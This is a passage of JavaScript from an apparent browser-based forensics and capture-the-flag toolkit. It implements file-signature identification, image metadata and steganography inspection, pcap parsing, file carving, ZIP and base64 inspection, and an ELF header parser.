      ui_btns([{ label: 'Scan for embedded files', onclick: 'carveFilesTool()', primary: true }]) +
      ui_field('Found signatures', ui_out('carveOutput'));
  },
  'zip-inspector': function () {
    return ui_field('ZIP file', '<input type="file" id="zipInput" accept=".zip">') +
      ui_btns([{ label: 'Inspect', onclick: 'inspectZipTool()', primary: true }]) +
      ui_field('Entries', ui_out('zipOutput'));
  },
  'b64-image-extractor': function () {
    return ui_field('Text containing one or more base64 blobs', ui_textarea('b64ImgInput', 8, 'Paste text / HTML / JSON that contains base64 data')) +
      ui_btns([{ label: 'Find & decode blobs', onclick: 'extractB64BlobsTool()', primary: true }]) +
      ui_field('Found blobs', ui_out('b64ImgOutput'));
  }
};

const FILE_SIGNATURES = [
  { hex: '89504e47', name: 'PNG image', ext: '.png' },
  { hex: 'ffd8ff', name: 'JPEG image', ext: '.jpg' },
  { hex: '47494638', name: 'GIF image', ext: '.gif' },
  { hex: '25504446', name: 'PDF document', ext: '.pdf' },
  { hex: '504b0304', name: 'ZIP archive (also docx/xlsx/pptx/jar/apk)', ext: '.zip' },
  { hex: '526172211a0700', name: 'RAR archive', ext: '.rar' },
  { hex: '377abcaf271c', name: '7-Zip archive', ext: '.7z' },
  { hex: '7f454c46', name: 'ELF binary', ext: '' },
  { hex: '4d5a', name: 'Windows PE/DOS executable', ext: '.exe' },
  { hex: 'cafebabe', name: 'Java class file / Mach-O fat binary', ext: '.class' },
  { hex: 'feedface', name: 'Mach-O binary (32-bit)', ext: '' },
  { hex: 'feedfacf', name: 'Mach-O binary (64-bit)', ext: '' },
  { hex: '424d', name: 'BMP image', ext: '.bmp' },
  { hex: '49492a00', name: 'TIFF image (little-endian)', ext: '.tif' },
  { hex: '4d4d002a', name: 'TIFF image (big-endian)', ext: '.tif' },
  { hex: '1f8b08', name: 'GZIP archive', ext: '.gz' },
  { hex: '425a68', name: 'BZIP2 archive', ext: '.bz2' },
  { hex: 'fd377a585a00', name: 'XZ archive', ext: '.xz' },
  { hex: '377573746172', name: 'TAR archive (ustar)', ext: '.tar' },
  { hex: '52494646', name: 'RIFF container (WAV/AVI)', ext: '' },
  { hex: '4f676753', name: 'OGG container', ext: '.ogg' },
  { hex: '494433', name: 'MP3 with ID3 tag', ext: '.mp3' },
  { hex: '66747970', name: 'MP4/MOV (at offset 4)', ext: '.mp4' },
  { hex: '53514c69746520666f726d6174', name: 'SQLite database', ext: '.sqlite' },
  { hex: '4c000000', name: 'Windows shortcut (.lnk)', ext: '.lnk' },
  { hex: '7573746172', name: 'tar (older variant)', ext: '.tar' }
];
async function identifyFileTool() {
  const f = document.getElementById('fileIdInput').files[0];
  if (!f) { toast('Choose a file first', 'err'); return; }
  const buf = await readFileAsArrayBuffer(f);
  const bytes = new Uint8Array(buf).slice(0, 32);
  const hex = bytesToHex(bytes);
  const matches = FILE_SIGNATURES.filter(function (sig) { return hex.startsWith(sig.hex) || hex.slice(8).startsWith(sig.hex); });
  let html = '<table class="kv-table">' +
    '<tr><td>Filename</td><td>' + escapeHtml(f.name) + '</td></tr>' +
    '<tr><td>Reported type</td><td>' + (f.type || 'unknown') + '</td></tr>' +
    '<tr><td>Size</td><td>' + f.size.toLocaleString() + ' bytes</td></tr>' +
    '<tr><td>First 16 bytes</td><td>' + wrapGroups(hex.slice(0, 32), 2) + '</td></tr>' +
    '</table>';
  html += matches.length
    ? '<div class="hint"><strong>Identified as:</strong> ' + matches.map(function (m) { return m.name; }).join(' / ') + '</div>'
    : '<div class="hint warn">No known signature matched the first bytes — could be raw data, an uncommon format, or a format with no fixed magic (plain text, some configs).</div>';
  setOut('fileIdOutput', html);
}

async function extractMetadataTool() {
  const f = document.getElementById('metaInput').files[0];
  if (!f) { toast('Choose an image first', 'err'); return; }
  const buf = await readFileAsArrayBuffer(f);
  const bytes = new Uint8Array(buf);
  const hex = bytesToHex(bytes.slice(0, 8));
  let html = '<table class="kv-table"><tr><td>File</td><td>' + escapeHtml(f.name) + ', ' + f.size + ' bytes</td></tr>';
  if (hex.startsWith('89504e47')) {
    html += '<tr><td>Format</td><td>PNG</td></tr>';
    let off = 8;
    const chunks = [];
    while (off + 8 <= bytes.length) {
      const len = (bytes[off] << 24 | bytes[off + 1] << 16 | bytes[off + 2] << 8 | bytes[off + 3]) >>> 0;
      const type = String.fromCharCode(bytes[off + 4], bytes[off + 5], bytes[off + 6], bytes[off + 7]);
      chunks.push({ type: type, len: len, dataOff: off + 8 });
      if (type === 'IHDR') {
        const d = off + 8;
        const w = (bytes[d] << 24 | bytes[d + 1] << 16 | bytes[d + 2] << 8 | bytes[d + 3]) >>> 0;
        const h = (bytes[d + 4] << 24 | bytes[d + 5] << 16 | bytes[d + 6] << 8 | bytes[d + 7]) >>> 0;
        html += '<tr><td>Dimensions</td><td>' + w + ' × ' + h + ' px</td></tr>';
        html += '<tr><td>Bit depth / color type</td><td>' + bytes[d + 8] + ' / ' + bytes[d + 9] + '</td></tr>';
      }
      if (type === 'tEXt' || type === 'iTXt') {
        const dataBytes = bytes.slice(off + 8, off + 8 + len);
        const text = bytesToAsciiPreview(dataBytes).replace(/\0/g, ': ');
        html += '<tr><td>' + type + '</td><td>' + escapeHtml(text) + '</td></tr>';
      }
      if (type === 'IEND') break;
      off += 8 + len + 4; // length+type+data+crc
    }
    html += '<tr><td>Chunk count</td><td>' + chunks.length + ' (' + chunks.map(function (c) { return c.type; }).join(', ') + ')</td></tr>';
  } else if (hex.startsWith('ffd8ff')) {
    html += '<tr><td>Format</td><td>JPEG</td></tr>';
    let off = 2;
    const segs = [];
    while (off + 4 < bytes.length) {
      if (bytes[off] !== 0xff) break;
      const marker = bytes[off + 1];
      if (marker === 0xd8 || marker === 0xd9) { off += 2; continue; }
      if (marker >= 0xd0 && marker <= 0xd7) { off += 2; continue; }
      const len = bytes[off + 2] << 8 | bytes[off + 3];
      segs.push({ marker: marker.toString(16), len: len });
      if (marker === 0xe1) { // APP1 / EXIF
        const seg = bytes.slice(off + 4, off + 2 + len);
        const txt = bytesToAsciiPreview(seg).slice(0, 200);
        html += '<tr><td>EXIF (APP1) preview</td><td>' + escapeHtml(txt) + '</td></tr>';
      }
      if (marker === 0xc0 || marker === 0xc2) {
        const h = bytes[off + 5] << 8 | bytes[off + 6];
        const w = bytes[off + 7] << 8 | bytes[off + 8];
        html += '<tr><td>Dimensions</td><td>' + w + ' × ' + h + ' px</td></tr>';
      }
      if (marker === 0xda) break;
      off += 2 + len;
    }
    html += '<tr><td>Segments seen</td><td>' + segs.map(function (s) { return 'FF' + s.marker.toUpperCase(); }).join(', ') + '</td></tr>';
  } else {
    html += '<tr><td>Format</td><td>Not PNG or JPEG — this tool reads those two formats\' real chunk/segment structure.</td></tr>';
  }
  html += '</table>';
  setOut('metaOutput', html);
}

async function hexViewTool() {
  const f = document.getElementById('hexViewInput').files[0];
  if (!f) { toast('Choose a file first', 'err'); return; }
  const buf = await readFileAsArrayBuffer(f);
  const bytes = new Uint8Array(buf);
  window.__hexViewBytes = bytes;
  const find = document.getElementById('hexViewFind').value.trim();
  let highlightNote = '';
  if (find) {
    const needle = /^[0-9a-fA-F\s]+$/.test(find) && find.replace(/\s/g, '').length % 2 === 0 ? hexToBytesArr(find) : new TextEncoder().encode(find);
    const hits = [];
    for (let i = 0; i <= bytes.length - needle.length; i++) {
      let ok = true;
      for (let j = 0; j < needle.length; j++) if (bytes[i + j] !== needle[j]) { ok = false; break; }
      if (ok) hits.push(i);
      if (hits.length >= 50) break;
    }
    highlightNote = hits.length ? ('\n\nFound "' + find + '" at offset(s): ' + hits.map(function (h) { return '0x' + h.toString(16); }).join(', ')) : ('\n\n"' + find + '" not found.');
  }
  document.getElementById('hexViewOutput').textContent = hexDump(bytes, 8192) + highlightNote;
}

function textEncode16LE(str) { return new Uint16Array(Array.from(str).map(function (c) { return c.charCodeAt(0); })); }
async function extractStringsTool() {
  const f = document.getElementById('strInput').files[0];
  if (!f) { toast('Choose a file first', 'err'); return; }
  const buf = await readFileAsArrayBuffer(f);
  const bytes = new Uint8Array(buf);
  const minLen = Math.max(2, Number(document.getElementById('strMinLen').value) || 4);
  const enc = document.getElementById('strEncoding').value;
  const results = [];
  if (enc === 'ascii' || enc === 'both') {
    let cur = '';
    for (let i = 0; i < bytes.length; i++) {
      const b = bytes[i];
      if (b >= 32 && b <= 126) cur += String.fromCharCode(b);
      else { if (cur.length >= minLen) results.push(cur); cur = ''; }
    }
    if (cur.length >= minLen) results.push(cur);
  }
  if (enc === 'utf16' || enc === 'both') {
    let cur = '';
    for (let i = 0; i + 1 < bytes.length; i += 2) {
      const code = bytes[i] | (bytes[i + 1] << 8);
      if (code >= 32 && code <= 126 && bytes[i + 1] === 0) cur += String.fromCharCode(code);
      else { if (cur.length >= minLen) results.push(cur); cur = ''; }
    }
    if (cur.length >= minLen) results.push(cur);
  }
  setOutText('strOutput', results.length ? (results.length + ' strings found:\n\n' + results.slice(0, 2000).join('\n')) : 'No strings of length ≥ ' + minLen + ' found.');
}

/* ---------------------------------------------------------------------- */
/* LSB steganography — real pixel-level bit extraction via canvas         */
/* ---------------------------------------------------------------------- */
function loadImageToCanvas(file) {
  return new Promise(function (resolve, reject) {
    const img = new Image();
    img.onload = function () {
      const canvas = document.createElement('canvas');
      canvas.width = img.naturalWidth; canvas.height = img.naturalHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(img, 0, 0);
      resolve({ canvas: canvas, ctx: ctx, width: canvas.width, height: canvas.height });
      URL.revokeObjectURL(img.src);
    };
    img.onerror = reject;
    img.src = URL.createObjectURL(file);
  });
}
async function lsbExtractTool() {
  const f = document.getElementById('lsbInput').files[0];
  if (!f) { toast('Choose an image first', 'err'); return; }
  const bit = Number(document.getElementById('lsbBit').value);
  const channels = document.getElementById('lsbChannels').value;
  const chanIdx = { rgb: [0, 1, 2], r: [0], g: [1], b: [2], rgba: [0, 1, 2, 3] }[channels];
  const { ctx, width, height } = await loadImageToCanvas(f);
  const data = ctx.getImageData(0, 0, width, height).data;
  const bitsOut = [];
  for (let i = 0; i < data.length; i += 4) {
    chanIdx.forEach(function (c) { bitsOut.push((data[i + c] >> bit) & 1); });
  }
  const bytesOut = [];
  for (let i = 0; i + 8 <= bitsOut.length; i += 8) {
    let b = 0;
    for (let j = 0; j < 8; j++) b = (b << 1) | bitsOut[i + j];
    bytesOut.push(b);
    if (bytesOut.length >= 100000) break;
  }
  const bytes = new Uint8Array(bytesOut);
  window.__lsbExtractedBytes = bytes;
  setOutText('lsbTextOutput', bytesToAsciiPreview(bytes.slice(0, 4000)));
  setOutText('lsbHexOutput', wrapGroups(bytesToHex(bytes.slice(0, 2000)), 2));
  toast('Extracted ' + bytes.length + ' bytes from the ' + channels + ' channel(s), bit ' + bit);
}
async function lsbVisualizeTool() {
  const f = document.getElementById('lsbInput').files[0];
  if (!f) { toast('Choose an image first', 'err'); return; }
  const bit = Number(document.getElementById('lsbBit').value);
  const { ctx, width, height } = await loadImageToCanvas(f);
  const imgData = ctx.getImageData(0, 0, width, height);
  const data = imgData.data;
  for (let i = 0; i < data.length; i += 4) {
    for (let c = 0; c < 3; c++) data[i + c] = ((data[i + c] >> bit) & 1) ? 255 : 0;
  }
  const canvas = document.getElementById('lsbCanvas');
  canvas.width = width; canvas.height = height; canvas.style.display = 'block';
  canvas.getContext('2d').putImageData(imgData, 0, 0);
  toast('Rendered bit plane ' + bit + ' — patterns or hidden shapes often appear here');
}

async function stegoAnalyzeTool() {
  const f = document.getElementById('stegoInput').files[0];
  if (!f) { toast('Choose an image first', 'err'); return; }
  const buf = await readFileAsArrayBuffer(f);
  const bytes = new Uint8Array(buf);
  const hex = bytesToHex(bytes.slice(0, 8));
  let html = '<table class="kv-table">';
  // Trailing-data-after-EOF check
  let eofIdx = -1;
  if (hex.startsWith('89504e47')) {
    // search for IEND chunk CRC end
    const needle = [0x49, 0x45, 0x4e, 0x44];
    for (let i = bytes.length - 8; i >= 8; i--) {
      if (bytes[i] === needle[0] && bytes[i + 1] === needle[1] && bytes[i + 2] === needle[2] && bytes[i + 3] === needle[3]) { eofIdx = i + 8; break; }
    }
  } else if (hex.startsWith('ffd8ff')) {
    for (let i = bytes.length - 2; i >= 2; i--) {
      if (bytes[i] === 0xff && bytes[i + 1] === 0xd9) { eofIdx = i + 2; break; }
    }
  }
  if (eofIdx > -1 && eofIdx < bytes.length) {
    const trailing = bytes.length - eofIdx;
    html += '<tr><td>Trailing data after EOF marker</td><td><span class="badge warn">' + trailing + ' extra bytes</span> after the image\'s real end — common place to hide a flag or archive.</td></tr>';
  } else if (eofIdx > -1) {
    html += '<tr><td>Trailing data after EOF marker</td><td><span class="badge good">none</span></td></tr>';
  } else {
    html += '<tr><td>Trailing data check</td><td>skipped — not a recognized PNG/JPEG</td></tr>';
  }
  // Chi-square-ish LSB randomness check via canvas
  try {
    const { ctx, width, height } = await loadImageToCanvas(f);
    const data = ctx.getImageData(0, 0, width, height).data;
    let ones = 0, total = 0;
    for (let i = 0; i < data.length; i += 4) { ones += data[i] & 1; total++; }
    const ratio = ones / total;
    html += '<tr><td>Red-channel LSB "1" ratio</td><td>' + (ratio * 100).toFixed(2) + '% (natural photos cluster near 50% already, so this alone is weak evidence — use with the trailing-data check and visual bit-plane inspection)</td></tr>';
    html += '<tr><td>Dimensions</td><td>' + width + ' × ' + height + '</td></tr>';
  } catch (e) {}
  html += '<tr><td>File entropy</td><td>' + calcShannonEntropy(bytes).toFixed(3) + ' bits/byte</td></tr>';
  html += '</table>';
  setOut('stegoOutput', html);
}

/* ---------------------------------------------------------------------- */
/* PCAP parser — real libpcap global/record header parsing                */
/* ---------------------------------------------------------------------- */
const IP_PROTOS = { 1: 'ICMP', 6: 'TCP', 17: 'UDP', 2: 'IGMP', 47: 'GRE', 50: 'ESP', 51: 'AH', 58: 'ICMPv6', 89: 'OSPF' };
async function parsePcapTool() {
  const f = document.getElementById('pcapInput').files[0];
  if (!f) { toast('Choose a .pcap file first', 'err'); return; }
  const buf = await readFileAsArrayBuffer(f);
  const dv = new DataView(buf);
  if (buf.byteLength < 24) { setOutText('pcapOutput', 'File too small to be a pcap.'); return; }
  const magic = dv.getUint32(0, true);
  let little = true;
  if (magic === 0xa1b2c3d4) little = true;
  else if (dv.getUint32(0, false) === 0xa1b2c3d4) little = false;
  else { setOutText('pcapOutput', 'Not a classic libpcap file (magic ' + magic.toString(16) + '). pcapng is a different format and isn\'t parsed by this tool.'); return; }
  const linktype = dv.getUint32(20, little);
  let off = 24;
  const packets = [];
  while (off + 16 <= buf.byteLength && packets.length < 500) {
    const tsSec = dv.getUint32(off, little);
    const tsUsec = dv.getUint32(off + 4, little);
    const capLen = dv.getUint32(off + 8, little);
    const origLen = dv.getUint32(off + 12, little);
    const dataOff = off + 16;
    if (dataOff + capLen > buf.byteLength) break;
    let proto = 'unknown', info = '';
    if (linktype === 1 && capLen >= 34) { // Ethernet
      const etherType = dv.getUint16(dataOff + 12, false);
      if (etherType === 0x0800 && capLen >= 34) { // IPv4
        const ipProto = dv.getUint8(dataOff + 14 + 9);
        proto = IP_PROTOS[ipProto] || ('IP proto ' + ipProto);
        const srcIp = Array.from({ length: 4 }, function (_, i) { return dv.getUint8(dataOff + 14 + 12 + i); }).join('.');
        const dstIp = Array.from({ length: 4 }, function (_, i) { return dv.getUint8(dataOff + 14 + 16 + i); }).join('.');
        info = srcIp + ' → ' + dstIp;
        if ((ipProto === 6 || ipProto === 17) && capLen >= 38) {
          const ihl = (dv.getUint8(dataOff + 14) & 0x0f) * 4;
          const tOff = dataOff + 14 + ihl;
          if (tOff + 4 <= buf.byteLength) {
            const sport = dv.getUint16(tOff, false), dport = dv.getUint16(tOff + 2, false);
            info += ':' + sport + ' → ' + dstIp + ':' + dport;
          }
        }
      } else if (etherType === 0x0806) proto = 'ARP';
      else if (etherType === 0x86dd) proto = 'IPv6';
      else proto = 'ethertype 0x' + etherType.toString(16);
    }
    packets.push({ i: packets.length + 1, ts: tsSec + '.' + String(tsUsec).padStart(6, '0'), len: origLen, cap: capLen, proto: proto, info: info });
    off = dataOff + capLen;
  }
  let html = '<table class="data-tbl"><tr><th>#</th><th>time</th><th>len</th><th>proto</th><th>info</th></tr>';
  packets.forEach(function (p) { html += '<tr><td>' + p.i + '</td><td>' + p.ts + '</td><td>' + p.len + '</td><td>' + p.proto + '</td><td>' + escapeHtml(p.info) + '</td></tr>'; });
  html += '</table><div class="hint">Link-layer type: ' + linktype + ' (1 = Ethernet). ' + packets.length + ' packet(s) parsed' + (packets.length === 500 ? ' (showing first 500)' : '') + '.</div>';
  setOut('pcapOutput', html);
}

/* ---------------------------------------------------------------------- */
/* File carver — signature scan over a whole blob                        */
/* ---------------------------------------------------------------------- */
const CARVE_SIGS = [
  { name: 'PNG', hex: '89504e47' }, { name: 'JPEG', hex: 'ffd8ff' }, { name: 'GIF', hex: '47494638' },
  { name: 'ZIP', hex: '504b0304' }, { name: 'PDF', hex: '25504446' }, { name: 'RAR', hex: '526172211a0700' },
  { name: 'ELF', hex: '7f454c46' }, { name: 'BMP', hex: '424d' }, { name: 'GZIP', hex: '1f8b08' }
];
window.__carveBytes = null;
async function carveFilesTool() {
  const f = document.getElementById('carveInput').files[0];
  if (!f) { toast('Choose a file first', 'err'); return; }
  const buf = await readFileAsArrayBuffer(f);
  const bytes = new Uint8Array(buf);
  window.__carveBytes = bytes;
  const hex = bytesToHex(bytes);
  const hits = [];
  CARVE_SIGS.forEach(function (sig) {
    let idx = 0;
    while (true) {
      const pos = hex.indexOf(sig.hex, idx);
      if (pos === -1 || pos % 2 !== 0) break;
      hits.push({ name: sig.name, offset: pos / 2 });
      idx = pos + 2;
      if (hits.length > 200) break;
    }
  });
  hits.sort(function (a, b) { return a.offset - b.offset; });
  if (!hits.length) { setOutText('carveOutput', 'No known file signatures found inside this blob.'); return; }
  let html = '<table class="data-tbl"><tr><th>#</th><th>type</th><th>offset</th><th></th></tr>';
  hits.forEach(function (h, i) {
    html += '<tr><td>' + (i + 1) + '</td><td>' + h.name + '</td><td>0x' + h.offset.toString(16) + '</td><td><button class="btn" type="button" onclick="carveExtract(' + h.offset + ',' + i + ')">Extract from here</button></td></tr>';
  });
  html += '</table><div class="hint">Extraction cuts from the found offset to the next signature (or end of file) — trim manually if the real file is shorter.</div>';
  setOut('carveOutput', html);
  window.__carveHits = hits;
}
function carveExtract(offset, idx) {
  const bytes = window.__carveBytes;
  const hits = window.__carveHits;
  const next = hits[idx + 1] ? hits[idx + 1].offset : bytes.length;
  const slice = bytes.slice(offset, next);
  downloadBlob('carved_' + hits[idx].name.toLowerCase() + '_' + offset + '.bin', slice);
}

/* ---------------------------------------------------------------------- */
/* ZIP inspector (via JSZip)                                              */
/* ---------------------------------------------------------------------- */
async function inspectZipTool() {
  const f = document.getElementById('zipInput').files[0];
  if (!f) { toast('Choose a .zip file first', 'err'); return; }
  try {
    const zip = await JSZip.loadAsync(f);
    let html = '<table class="data-tbl"><tr><th>name</th><th>size</th><th>compressed</th><th>encrypted?</th></tr>';
    const entries = Object.values(zip.files);
    for (const entry of entries) {
      const bytes = entry.dir ? null : await entry.async('uint8array').catch(function () { return null; });
      const encrypted = bytes === null && !entry.dir;
      html += '<tr><td>' + escapeHtml(entry.name) + (entry.dir ? ' <em>(dir)</em>' : '') + '</td><td>' +
        (entry._data ? entry._data.uncompressedSize : '—') + '</td><td>' + (entry._data ? entry._data.compressedSize : '—') +
        '</td><td>' + (encrypted ? '<span class="badge warn">possibly</span>' : '—') + '</td></tr>';
    }
    html += '</table><div class="hint">' + entries.length + ' entries. Password-protected ZIPs can\'t be fully verified client-side without the password — try the names above against common CTF tricks (zip comment, nested archives).</div>';
    setOut('zipOutput', html);
  } catch (e) {
    setOut('zipOutput', '<div class="hint warn">Could not read as ZIP: ' + escapeHtml(e.message) + '</div>');
  }
}

/* ---------------------------------------------------------------------- */
/* Base64 blob finder                                                     */
/* ---------------------------------------------------------------------- */
function extractB64BlobsTool() {
  const rawText = document.getElementById('b64ImgInput').value;
  // 1) Rejoin PEM/data-URI-style line-wrapped base64 before matching: when 2+ consecutive lines each
  //    consist entirely of base64-alphabet characters (the last one optionally ending in padding),
  //    that's formatting, not a boundary — collapse those runs so the regex sees one blob, not N.
  const lines = rawText.split(/\r\n|\r|\n/);
  const dewrapped = [];
  let run = [];
  function flushRun() { if (run.length >= 2) dewrapped.push(run.join('')); else dewrapped.push.apply(dewrapped, run); run = []; }
  lines.forEach(function (line) {
    const t = line.trim();
    if (/^[A-Za-z0-9+/]+=?=?$/.test(t) && t.length > 0) run.push(t);
    else { flushRun(); dewrapped.push(line); }
  });
  flushRun();
  const text = dewrapped.join('\n');
  // 2) Match both the standard alphabet and the URL-safe one (RFC 4648 §5 — JWTs, many embedded
  //    tokens) with a low floor on the charset run so padding-heavy short blobs aren't excluded before
  //    the real length filter runs, since '=' padding isn't part of either character class.
  const reStd = /[A-Za-z0-9+/]{4,}={0,2}/g;
  const reUrl = /[A-Za-z0-9_-]{4,}/g;
  const rawMatches = (text.match(reStd) || []).concat(text.match(reUrl) || []);
  const unique = Array.from(new Set(rawMatches)).filter(function (m) {
    if (m.length < 24) return false; // total length including padding, not just data chars
    if (/^[0-9a-fA-F]+$/.test(m)) return false; // indistinguishable from a hex digest/hash — not a confident base64 find
    return true;
  });
  if (!unique.length) { setOutText('b64ImgOutput', 'No base64-looking blobs (24+ chars, standard or URL-safe alphabet) found.'); return; }
  let html = '';
  unique.forEach(function (blob, i) {
    let decodedPreview = '';
    let bytes = null;
    try {
      const normalized = blob.replace(/-/g, '+').replace(/_/g, '/'); // URL-safe -> standard alphabet
      const bin = atob(normalized.replace(/=+$/, '').padEnd(Math.ceil(normalized.replace(/=+$/, '').length / 4) * 4, '='));
      bytes = new Uint8Array(bin.length);
      for (let j = 0; j < bin.length; j++) bytes[j] = bin.charCodeAt(j);
      decodedPreview = bytesToAsciiPreview(bytes.slice(0, 60));
    } catch (e) { decodedPreview = '(not valid base64)'; }
    const sigMatch = bytes ? FILE_SIGNATURES.find(function (s) { return bytesToHex(bytes.slice(0, 8)).startsWith(s.hex); }) : null;
    html += '<p><strong>Blob ' + (i + 1) + '</strong> (' + blob.length + ' chars)' + (sigMatch ? ' — looks like <span class="badge good">' + sigMatch.name + '</span>' : '') + '<br>' +
      '<span style="color:var(--ink-faint)">' + escapeHtml(decodedPreview) + '…</span><br>' +
      (bytes ? '<button class="btn" type="button" onclick="downloadBlob(\'blob' + i + (sigMatch ? sigMatch.ext : '.bin') + '\', new Uint8Array(' + JSON.stringify(Array.from(bytes)) + '))">Download as file</button>' : '') +
      '</p>';
  });
  setOut('b64ImgOutput', html);
}

/* ---------------------------------------------------------------------- */
/* REVERSE ENGINEERING — catalog                                          */
/* ---------------------------------------------------------------------- */
registerTool('reverse', 'REV', 'REV-01', 'elf-parser', 'ELF Header Parser', 'Parses the real ELF header, program headers and section table of a Linux binary.');
registerTool('reverse', 'REV', 'REV-02', 'disassembler', 'x86-64 Disassembler', 'Intel-syntax x86-64 decoder: REX, ModRM/SIB, RIP-relative, jcc/setcc/cmov and more.');
registerTool('reverse', 'REV', 'REV-03', 'binary-diff', 'Binary Diff', 'Byte-by-byte comparison of two files, highlighting every differing offset.');
registerTool('reverse', 'REV', 'REV-04', 'endian-converter', 'Endianness Converter', 'Flips byte order for 16/32/64-bit values, hex or decimal.');
registerTool('reverse', 'REV', 'REV-05', 'syscall-reference', 'x86-64 Linux Syscall Table', 'Searchable reference of Linux x86-64 syscall numbers and signatures.');
registerTool('reverse', 'REV', 'REV-06', 'opcode-reference', 'x86 Opcode Reference', 'Quick lookup for common x86/x86-64 opcode bytes.');
registerTool('reverse', 'REV', 'REV-07', 'entropy-scan', 'Section Entropy Scanner', 'Chunks a binary and plots entropy per chunk — spikes often mean packing or encryption.');

const REVERSE_INTERFACES = {
  'elf-parser': function () {
    return ui_field('ELF binary', '<input type="file" id="elfInput">') +
      ui_btns([{ label: 'Parse', onclick: 'parseElfTool()', primary: true }]) +
      ui_field('Header', ui_out('elfOutput'));
  },
  disassembler: function () {
    return ui_field('Bytes (hex, e.g. 55 48 89 e5 90 c3)', ui_textarea('disasmInput', 4, '55 48 89 e5 48 83 ec 10 b8 00 00 00 00 90 c9 c3')) +
      ui_field('Base address (hex, optional)', '<input type="text" id="disasmBase" value="0" placeholder="401000">') +
      ui_btns([{ label: 'Disassemble', onclick: 'disassembleTool()', primary: true }]) +
      ui_field('Instructions', ui_out('disasmOutput')) +
      '<div class="hint">Intel syntax. Handles legacy/REX prefixes, ModRM/SIB addressing (incl. RIP-relative), the integer ALU/mov/shift/mul/div/jcc/setcc/cmov/movzx/movsx set, call/jmp/ret, syscall and endbr64. SSE/AVX/x87 are shown as (bad) rather than guessed.</div>';
  },
  'binary-diff': function () {
    return '<div class="row2">' + ui_field('File A', '<input type="file" id="diffA">') + ui_field('File B', '<input type="file" id="diffB">') + '</div>' +
      ui_btns([{ label: 'Compare', onclick: 'binaryDiffTool()', primary: true }]) +
      ui_field('Differences', ui_out('diffOutput'));
  },
  'endian-converter': function () {
    return ui_field('Value (hex like 0x12345678, or decimal)', '<input type="text" id="endianInput" placeholder="0x12345678">') +
      '<div class="field"><label>Width</label><select id="endianWidth"><option value="2">16-bit</option><option value="4" selected>32-bit</option><option value="8">64-bit</option></select></div>' +
      ui_btns([{ label: 'Swap', onclick: 'endianSwapTool()', primary: true }]) +
      ui_field('Result', ui_out('endianOutput'));
  },
  'syscall-reference': function () {
    return ui_field('Search (name or number)', '<input type="text" id="syscallSearch" placeholder="execve, open, 59…" oninput="renderSyscallTable()">') +
      '<div id="syscallOutput" class="out" style="max-height:420px"></div>';
  },
  'opcode-reference': function () {
    return ui_field('Search (mnemonic or byte)', '<input type="text" id="opcodeSearch" placeholder="push, c3, jmp…" oninput="renderOpcodeTable()">') +
      '<div id="opcodeOutput" class="out" style="max-height:420px"></div>';
  },
  'entropy-scan': function () {
    return ui_field('File', '<input type="file" id="entropyInput">') +
      ui_field('Chunk size (bytes)', '<input type="number" id="entropyChunk" value="256" min="32" max="8192">') +
      ui_btns([{ label: 'Scan', onclick: 'entropyScanTool()', primary: true }]) +
      ui_field('Entropy per chunk', ui_out('entropyOutput'));
  }
};

const ELF_MACHINES = { 3: 'x86', 62: 'x86-64', 40: 'ARM', 183: 'AArch64', 8: 'MIPS', 20: 'PowerPC', 21: 'PowerPC64', 243: 'RISC-V' };
async function parseElfTool() {
  const f = document.getElementById('elfInput').files[0];
  if (!f) { toast('Choose a file first', 'err'); return; }
  const buf = await readFileAsArrayBuffer(f);
  const bytes = new Uint8Array(buf);
  if (bytes.length < 20 || bytes[0] !== 0x7f || bytes[1] !== 0x45 || bytes[2] !== 0x4c || bytes[3] !== 0x46) {
    setOutText('elfOutput', 'Not an ELF file (missing \\x7fELF magic).'); return;
  }
  const is64 = bytes[4] === 2;
  const little = bytes[5] === 1;
  // A file that's between 20 bytes (passes the magic-number check above) and a full header's length
  // (52 for ELF32 / 64 for ELF64) used to throw an uncaught RangeError from the unguarded DataView
  // reads below instead of a graceful message.
  const headerLen = is64 ? 64 : 52;
  if (bytes.length < headerLen) { setOutText('elfOutput', 'File is too short to be a valid ' + (is64 ? 'ELF64' : 'ELF32') + ' header (' + bytes.length + ' bytes, need at least ' + headerLen + ').'); return; }
  let html;
  try {
  const dv = new DataView(buf);
  function u16(o) { return dv.getUint16(o, little); }
  function u32(o) { return dv.getUint32(o, little); }
  function u64(o) { return dv.getBigUint64(o, little); }
  const type = { 1: 'relocatable (ET_REL)', 2: 'executable (ET_EXEC)', 3: 'shared object (ET_DYN)', 4: 'core dump (ET_CORE)' }[u16(16)] || ('unknown (' + u16(16) + ')');
  const machine = ELF_MACHINES[u16(18)] || ('unknown (' + u16(18) + ')');
  const entry = is64 ? u64(24) : BigInt(u32(24));
  const phoff = is64 ? u64(32) : BigInt(u32(28));
  const shoff = is64 ? u64(40) : BigInt(u32(32));
  const phentsize = is64 ? u16(54) : u16(42);
  const phnum = is64 ? u16(56) : u16(44);
  const shentsize = is64 ? u16(58) : u16(46);
  const shnum = is64 ? u16(60) : u16(48);
  const shstrndx = is64 ? u16(62) : u16(50);

  html = '<table class="kv-table">' +
    '<tr><td>Class</td><td>' + (is64 ? 'ELF64' : 'ELF32') + '</td></tr>' +
    '<tr><td>Endianness</td><td>' + (little ? 'little-endian' : 'big-endian') + '</td></tr>' +
    '<tr><td>Type</td><td>' + type + '</td></tr>' +
    '<tr><td>Machine</td><td>' + machine + '</td></tr>' +
    '<tr><td>Entry point</td><td>0x' + entry.toString(16) + '</td></tr>' +
    '<tr><td>Program headers</td><td>' + phnum + ' × ' + phentsize + ' bytes @ 0x' + phoff.toString(16) + '</td></tr>' +
    '<tr><td>Section headers</td><td>' + shnum + ' × ' + shentsize + ' bytes @ 0x' + shoff.toString(16) + '</td></tr>' +
    '</table>';

  // Section names via shstrtab
  try {
    const shBase = Number(shoff);
    const strTabHdrOff = shBase + shstrndx * shentsize;
    const strTabOff = Number(is64 ? u64(strTabHdrOff + 24) : BigInt(u32(strTabHdrOff + 16)));
    const sections = [];
    for (let i = 0; i < shnum; i++) {
      const o = shBase + i * shentsize;
      const nameOff = u32(o);
      let name = '';
      let p = strTabOff + nameOff;
      while (p < bytes.length && bytes[p] !== 0) { name += String.fromCharCode(bytes[p]); p++; }
      const size = is64 ? u64(o + 32) : BigInt(u32(o + 20));
      sections.push(name || '(unnamed)' , size);
    }
    html += '<table class="data-tbl"><tr><th>#</th><th>section</th><th>size</th></tr>';
    for (let i = 0; i < sections.length; i += 2) {
